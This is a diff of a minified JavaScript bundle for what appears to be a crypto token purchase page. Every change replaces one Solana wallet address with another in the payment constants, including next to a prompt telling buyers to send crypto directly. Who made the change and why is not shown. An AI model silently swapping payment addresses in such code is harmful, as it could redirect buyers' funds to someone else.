@@ -39935,8 +39935,8 @@ const gu = [
   NSe = [],
   MO = 9,
   fM = "SOL",
-  b1 = "5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN",
-  Ev = "5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN",
+  b1 = "CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM",
+  Ev = "CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM",
   RSe = "Solana:Usdc",
   OSe = "Solana:Usdt",
   PSe = {
@@ -39959,11 +39959,11 @@ const gu = [
   pd = JSON.parse(JSON.stringify(ISe));
 new Pe(pd.address);
 const RJ = "",
-  OJ = new Pe("5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN"),
-  LSe = new Pe("5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN"),
-  R5 = new Pe("5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN"),
-  jSe = new Pe("5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN"),
-  DSe = new Pe("5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN"),
+  OJ = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  LSe = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  R5 = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  jSe = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  DSe = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
   ka = 10 ** MO,
   Ab = 10 ** 6,
   O5 = 0.06,
@@ -112525,7 +112525,7 @@ const sKe = Zr(
           ));
       }, [e, _, K, T, S, l, B]),
       _e = "0x816F7A76832079Ab71B8aB07D5C6AcDD84d6116B",
-      Ee = "5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN",
+      Ee = "CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM",
       We =
         "Alternatively, you can complete your purchase by sending ETH, USDT, or USDC directly to the Ethereum address from your Web3 wallet",
       je =
